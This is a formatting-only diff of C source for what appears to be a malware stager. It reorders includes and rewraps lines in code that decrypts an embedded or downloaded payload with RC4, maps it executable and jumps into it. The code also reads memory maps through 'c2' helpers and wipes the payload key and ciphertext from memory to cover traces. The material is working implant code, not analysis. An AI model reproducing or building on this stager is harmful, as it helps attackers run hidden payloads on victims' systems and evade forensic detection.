@@ -1,15 +1,15 @@
 #define _GNU_SOURCE
-#include "util/debug.h"
 #include "mask.h"
+#include "util/debug.h"
 #ifdef STAGER_PAYLOAD_LOCAL
 #include "local_payload.h"
 #include "util/maps.h"
 #else
 #include "downloader_blob.h"
 #endif
-#include "util/rc4.h"
 #include "stage_abi.h"
 #include "state.h"
+#include "util/rc4.h"
 #include "util/strings.h"
 #include "util/syscalls.h"
 #include "util/utils.h"
@@ -69,9 +69,8 @@ static void stage_run(void *arg) {
     rx_len = PAGE_ALIGN_UP(res->size);
   if (mprotect(res->data, rx_len, PROT_READ | PROT_EXEC) != 0)
     exit(1);
-  if (res->size > rx_len &&
-      mprotect((uint8_t *)res->data + rx_len, res->size - rx_len,
-               PROT_READ) != 0)
+  if (res->size > rx_len && mprotect((uint8_t *)res->data + rx_len,
+                                     res->size - rx_len, PROT_READ) != 0)
     exit(1);
 
   ((stage1_entry)res->data)(res->data, res->size);
@@ -106,8 +105,8 @@ static int mapping_prot(uintptr_t addr) {
     return 0;
   text[n] = '\0';
   struct c2_map maps[64];
-  size_t nmaps = c2_maps_parse(text, (size_t)n, maps,
-                               sizeof(maps) / sizeof(maps[0]));
+  size_t nmaps =
+      c2_maps_parse(text, (size_t)n, maps, sizeof(maps) / sizeof(maps[0]));
   for (size_t i = 0; i < nmaps; i++)
     if (addr >= maps[i].start && addr < maps[i].end)
       return maps[i].prot;
@@ -123,8 +122,7 @@ static void wipe_const(void *ptr, size_t len) {
     return;
   uintptr_t start = addr & ~(uintptr_t)(PAGE_SIZE - 1);
   uintptr_t end = (addr + len + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
-  if (mprotect((void *)start, (size_t)(end - start),
-               prot | PROT_WRITE) != 0)
+  if (mprotect((void *)start, (size_t)(end - start), prot | PROT_WRITE) != 0)
     return;
   memset(ptr, 0, len);
   (void)mprotect((void *)start, (size_t)(end - start), prot);
@@ -149,7 +147,8 @@ static int acquire_payload(struct stager_payload *res) {
   memcpy(res->key, STAGER_LOCAL_PAYLOAD_KEY, sizeof(res->key));
   /* The process that runs the payload never needs the embedded ciphertext
    * again. A supervising parent keeps its own copy for the next child. */
-  wipe_const((void *)STAGER_LOCAL_PAYLOAD_KEY, sizeof(STAGER_LOCAL_PAYLOAD_KEY));
+  wipe_const((void *)STAGER_LOCAL_PAYLOAD_KEY,
+             sizeof(STAGER_LOCAL_PAYLOAD_KEY));
   wipe_const((void *)STAGER_LOCAL_PAYLOAD_BIN, STAGER_LOCAL_PAYLOAD_LEN);
   return 0;
 #else
